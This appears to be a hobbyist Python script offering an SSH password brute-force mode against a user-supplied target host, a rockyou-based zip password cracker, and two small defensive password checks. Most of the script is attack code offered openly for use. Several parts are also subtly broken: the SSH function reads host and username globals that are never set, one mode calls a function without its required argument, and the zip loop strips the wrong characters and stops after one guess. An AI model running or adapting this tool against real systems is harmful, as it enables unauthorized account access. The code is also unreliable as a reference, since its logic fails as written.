#!/usr/bin/env python3

# File Name: BruteForceWordlistTool.py
# Author: Devin Iverson
# Date: 08/23/2022
# Purpose: Custom tool that performs brute force attacks

import pyfiglet
from rich.console import Console
from rich.table import Table
import time
import paramiko, sys, os, socket
from zipfile import ZipFile

global host, username, line, txt_file

line = "\n--------------------------------------------------\n"

con = Console()
# menu between two modes
def menu():
    con.print("* Main Menu *")
    con.print("-------------")
    con.print("Mode #1: Offensive Tool - Dictionary Iterator", style="red1")
    con.print("Mode #2: Defensive Tool - Password Recognized", style="blue")
    con.print("Mode #3: Defensive Tool - Password Complexity", style="blue")
    con.print("Mode #4: Offensive Tool - Brute Force ZipFile", style="red1")
    con.print("Mode #9: Exit Tool")
    con.print("-------------")
    
    menu_input = input("Enter Mode #: ")
    return menu_input

def traffic_signal(mode):
    if mode == '1':
        d = data_collection()
        host = d[0]
        username = d[1]
        txt_file = d[2]
        mode1(host, username, txt_file)
    elif mode == '2':
        mode2()
    elif mode == '3':
        mode3()
    elif mode == '4':
        mode4()
    elif mode == '9':
        exit
    else:
        print("Mode is not available at this time, please try again.")
        return 0

# unzip file
def zipBreaker(zip_file, password):
    try:
        with ZipFile(zip_file, 'r') as z:
            z.setpassword(password)
            z.extractall()
            print("File Extracted")
    except Exception as e:
        print("Invalid file", e)

# script banner with interesting loading bars
def script_banner():
    banner = pyfiglet.figlet_format("Brute Force",font="banner3-D",width=100,justify="center")
    con.print(banner, "A Brute Force Wordlist Tool used by all the cool hackers!",style="bold green1")
    time.sleep(0.1)
    print('\n')

# locate wordlist and access it
def wordlist_finder(txtfile):
    with open(txtfile) as f:
        lines = f.readlines()
    
    #remove new line characters
    word_list = [line.strip() for line in lines]
    f.close()
    return list(word_list)

# 
def data_collection():
    try:
        host = input("[*] Enter target host address: ")
        username = input("[*] Enter SSH Username: ")
        txt_file = input("[*] Enter SSH Password File: ")

        if os.path.exists(txt_file) == False:
            print ("\n[*] File Path does not exist !")
            sys.exit(4)
    except KeyboardInterrupt:
        print("\n\n[*] User Requested an interrupt")
        sys.exit(3)
    return (host, username, txt_file)
# 
def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        # Authentication Failed
        code = 1
    except socket.error as e:
        # Connection Failed ... Host Down
        code = 2
    
    ssh.close()
    return code

# brute force path
def brute_force(wordlist, username, host):
    for password in wordlist:
        try:
            response = ssh_connect(password)

            if response == 0:
                txt = "{} User: {} Pass Found: {} {}"
                print(txt.format(line, username, password, line))
                sys.exit(0)
            elif response == 1:
                txt = "User: {} Pass: {} Login Incorrect!"
                print(txt.format(username, password))
            elif response == 2:
                txt = "Connection Could not be established to address: {}"
                print(txt.format(host))
                sys.exit(2)
        except Exception as e:
            print(e)
            pass

# mode1: Offensive, Dictionary Iterator
def mode1(host, username, input_file):
    wordlist = wordlist_finder(input_file)
    brute_force(wordlist, username, host)


# mode2: Defensive, Password Recognized
def mode2():
    wordlist = wordlist_finder()
    keyword = str(input("Enter password: "))
    if keyword in wordlist:
        print("Password found in Wordlist")
    else:
        print("Password does not appear in Wordlist")

# Stretch Goals: Mode3: Defensive, Password Complexity
def mode3():
    l,c,n,s = 0,0,0,0
    keyword = str(input("Enter password to test: "))
    while True:
        complexity_code = int(input("Enter 4 digit Password Complexity Code: Example Code: 5432 (length,capitals,numbers,symbols): "))
        complexity_str = str(complexity_code)
        if len(complexity_str) == 4:
            break
    length = int(complexity_str[0])
    capitals = int(complexity_str[1])
    nums = int(complexity_str[2])
    symbols = int(complexity_str[3])
    for k in keyword:
        l+=1
        if (k.isupper()):
            c+=1
        if (k.isdigit()):
            n+=1
        if (k in '!@#$%^&*()_-|\/?`~<>[]}{+='):
            s+=1
    
    if (l>=length and c>=capitals and n>=nums and s>=symbols):
        con.print("SUCCESS", style="bold green")
    else:
        #txt = ("Password Failed \n Complexity: Required: Provided: \n Length:   {0}   {1}\n   Capitals:   {2}   {3}\n   Numbers:   {4}   {5}\n   Symbols:   {6}   {7}")
        #print(txt.format(length,l,capitals,c,nums,n,symbols,s))

        # print table of provided requirements and the end result of processing password
        table = Table(title="Password Failed")

        table.add_column("Category", justify="right", no_wrap=True)
        table.add_column("Required by Code", justify="center")
        table.add_column("Password Provided", justify="right")

        table.add_row("Length", str(length), str(l))
        table.add_row("Capitals", str(capitals), str(c))
        table.add_row("Numbers", str(nums), str(n))
        table.add_row("Symbols", str(symbols), str(s))

        con.print(table)

# brute force zip file
def mode4():
    zip_file = "TestFile.zip"
    wordlist = "rockyou.txt"
    with open(wordlist, "r") as wlist:
        for word in wlist:
            passwd = word.strip("/n")

            try:
                with ZipFile(zip_file) as zf:
                    zf.extractall(pwd=bytes(passwd, 'utf-8'))
                    txt = "{} User: {} Pass Found: {} {}"
                    print(txt.format(line, username, passwd, line))
                    break
            
            except RuntimeError:
                print("Not the Password")
                break

# main function
def main():
    script_banner()
    while True:
        mode = menu()
        if mode in '1234':
            traffic_signal(mode)
        elif mode == '9':
            break
        else:
            con.print("Mode not available at this time, try again", style='red1')
            continue
main()
